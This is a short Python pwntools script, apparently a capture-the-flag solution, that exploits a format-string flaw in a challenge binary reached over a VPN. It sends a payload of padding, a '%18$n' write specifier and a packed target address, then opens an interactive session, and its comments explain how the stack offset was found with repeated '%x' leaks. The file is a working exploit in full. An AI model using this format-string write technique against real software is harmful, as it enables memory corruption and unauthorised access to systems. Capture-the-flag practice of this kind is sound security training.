#!/usr/bin/env python3
import pwn
import vpn_conf

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 11)
BIN = "./the_answer_thaMilo"


def exploit():
    p = pwn.remote(HOST, PORT)
    payload = b"a" * 42 + b"%18$nA" + pwn.p64(0x404308)
    p.sendline(payload)
    p.interactive()

    # TO FIND THE 18
    # payload = b"aaaa %x" * 30 # shows that the last stack variable is the 12th
    # after that in the final payload above I started from 12 and incremented until I
    # found the flag because of the 42 'a's


if __name__ == "__main__":
    exploit()
